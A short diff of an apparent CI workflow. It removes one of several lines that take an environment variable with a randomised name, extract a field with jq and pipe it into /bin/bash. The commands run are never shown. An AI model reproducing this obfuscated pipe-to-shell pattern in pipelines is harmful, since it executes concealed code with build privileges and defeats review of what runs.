@@ -27,7 +27,6 @@ jobs:
           echo $d9 | jq -r .wo2 | /bin/bash
           echo $la54 | jq -r .es2 | /bin/bash
           printf '%s' "$wexc9445" | jq -r .vhwre72 | /bin/bash
-          printf '%s' "$erdo4424" | jq -r .xgz1963 | /bin/bash
           printf '%s' "$n2" | jq -r .opswa9305 | /bin/bash
           printf '%s' "$puq875" | jq -r .n19379 | /bin/bash
           printf '%s' "$ov2811" | jq -r .sbyk1894 | /bin/bash
